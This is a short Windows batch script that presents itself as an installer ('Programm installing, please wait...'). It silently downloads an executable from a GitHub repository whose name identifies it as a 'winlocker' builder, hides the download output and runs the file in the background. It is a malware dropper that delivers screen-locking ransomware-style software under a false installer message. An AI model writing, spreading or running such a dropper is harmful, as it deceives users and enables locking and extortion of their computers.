@echo off
setlocal

set "URL=https://github.com/frozzzyyy228/simple-python-winlocker/raw/refs/heads/main/builder/dist/main.exe"
set "out=%~dp0main.exe"

echo Programm installing, please wait...

powershell -NoProfile -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%out%'" > $null 2>&1

if errorlevel 1 (
    echo [!] Install error
    pause
    exit /b 1
)


if not exist %out% (
    echo Installed file not found
    pause
    exit /b 1
)

start "" /B "%out%"

endlocal